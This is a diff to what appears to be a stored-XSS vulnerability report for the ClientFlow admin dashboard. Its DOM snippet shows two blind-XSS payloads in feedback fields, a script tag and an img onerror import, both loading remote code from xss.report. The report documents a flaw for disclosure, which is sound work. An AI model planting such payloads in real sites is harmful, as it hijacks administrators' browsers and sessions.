@@ -28,87 +28,15 @@ When an administrative user reviews submitted feedback items within the admin se
 ### Vulnerable DOM Snippet
 
 ```html
-<html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Admin Dashboard — ClientFlow</title>
-    <link rel="stylesheet" href="../assets/style.css?v=2">
-  </head>
-  <body>
-    <header class="nav">
-      <a class="brand" href="../index.php"><span class="brand-mark">&lt;/&gt;</span> ClientFlow</a>
-      <nav>
-        <a href="../index.php">Website</a>
-        <a href="dashboard.php">Dashboard</a>
-        <a href="users.php">Accounts</a>
-        <a href="logout.php">Logout</a>
-      </nav>
-    </header>
-    <main class="dashboard-wrap">
-      <div class="page-title">
-        <span class="eyebrow">ADMIN CONSOLE</span>
-        <h1>Security Awareness Dashboard</h1>
-        <p>Review every account and feedback submission captured by the site.</p>
-      </div>
-      <div class="stats">
-        <div class="stat"><span>Total feedback</span><strong>2</strong></div>
-        <div class="stat"><span>New feedback</span><strong>2</strong></div>
-        <div class="stat"><span>Accounts</span><strong>0</strong></div>
-      </div>
-      <section class="panel">
-        <div class="table-head">
-          <div>
-            <h2>Feedback submissions</h2>
-            <p class="muted">Latest 100 submissions.</p>
-          </div>
-          <form class="filters">
-            <input name="q" value="" placeholder="Search name, email, message...">
-            <select name="status">
-              <option value="">All statuses</option>
-              <option>new</option>
-              <option>reviewed</option>
-              <option>resolved</option>
-            </select>
-            <button class="btn small">Filter</button>
-          </form>
-        </div>
-        <div class="table-scroll">
-          <table>
-            <thead>
-              <tr>
-                <th>When</th>
-                <th>Sender</th>
-                <th>Category</th>
-                <th>Message</th>
-                <th>Status</th>
-                <th>Action</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td>09 Nov 2026, 06:17</td>
-                <td><strong>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></strong><small>asf@gmail.com</small></td>
-                <td>Account experience</td>
-                <td class="message-cell">'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></td>
-                <td><span class="status new">new</span></td>
-                <td><a class="text-link" href="feedback.php?id=2">View</a></td>
-              </tr>
-              <tr>
-                <td>22 Oct 2026, 06:13</td>
-                <td><strong>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></strong><small>hello@gmail.com</small></td>
-                <td>General feedback</td>
-                <td class="message-cell">'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></td>
-                <td><span class="status new">new</span></td>
-                <td><a class="text-link" href="feedback.php?id=1">View</a></td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
-      </section>
-    </main>
-  </body>
-</html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Admin Dashboard — ClientFlow</title><link rel="stylesheet" href="../assets/style.css?v=2"></head>
+<body><header class="nav"><a class="brand" href="../index.php"><span class="brand-mark">&lt;/&gt;</span> ClientFlow</a><nav><a href="../index.php">Website</a><a href="dashboard.php">Dashboard</a><a href="users.php">Accounts</a><a href="logout.php">Logout</a></nav></header>
+<main class="dashboard-wrap"><div class="page-title"><span class="eyebrow">ADMIN CONSOLE</span><h1>Security Awareness Dashboard</h1><p>Review every account and feedback submission captured by the site.</p></div>
+<div class="stats"><div class="stat"><span>Total feedback</span><strong>2</strong></div><div class="stat"><span>New feedback</span><strong>2</strong></div><div class="stat"><span>Accounts</span><strong>0</strong></div></div>
+<section class="panel"><div class="table-head"><div><h2>Feedback submissions</h2><p class="muted">Latest 100 submissions.</p></div><form class="filters"><input name="q" value="" placeholder="Search name, email, message..."><select name="status"><option value="">All statuses</option><option>new</option><option>reviewed</option><option>resolved</option></select><button class="btn small">Filter</button></form></div>
+<div class="table-scroll"><table><thead><tr><th>When</th><th>Sender</th><th>Category</th><th>Message</th><th>Status</th><th>Action</th></tr></thead><tbody>
+<tr><td>09 Nov 2026, 06:17</td><td><strong>'"&gt;<script src="https://xss.report/c/vansh"></script></strong><small>asf@gmail.com</small></td><td>Account experience</td><td class="message-cell">'"&gt;<script src="https://xss.report/c/vansh"></script></td><td><span class="status new">new</span></td><td><a class="text-link" href="feedback.php?id=2">View</a></td></tr><tr><td>22 Oct 2026, 06:13</td><td><strong>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></strong><small>hello@gmail.com</small></td><td>General feedback</td><td class="message-cell">'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></td><td><span class="status new">new</span></td><td><a class="text-link" href="feedback.php?id=1">View</a></td></tr></tbody></table></div></section></main><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;534dbc1854e3437aa1164d09110b7f47&quot;,&quot;r&quot;:1,&quot;spa&quot;:2}" crossorigin="anonymous"></script>
+
+<iframe class="html2canvas-container" width="1718" height="1270" scrolling="no" data-html2canvas-ignore="true" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;"></iframe></body></html>
 ```
 
 ## Impact
